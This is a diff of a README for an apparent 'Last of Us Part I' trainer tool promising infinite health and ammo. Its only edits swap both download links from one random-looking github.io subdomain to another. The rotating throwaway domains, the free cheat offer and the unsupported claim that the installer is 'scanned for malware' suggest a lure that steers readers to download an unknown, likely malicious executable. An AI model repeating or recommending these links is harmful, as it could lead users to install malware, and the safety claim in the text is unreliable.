@@ -2,7 +2,7 @@
 
 Welcome to the official repository for The Last of Us Part I Enhanced Toolbox. This tool is designed for The Last of Us Part I players who want to enhance their gaming experience with various customization options. The last of us part 1 trainer provides features like infinite health and ammo for a more enjoyable playthrough on Windows 10 and 11. Whether you're looking to overcome challenging sections or experiment with different playstyles, this tool offers a suite of enhancements to tailor your adventure.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ Yes, the tool is scanned for malware and viruses. It does not modify game files 
 
 For the latest version, updates, and additional information, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
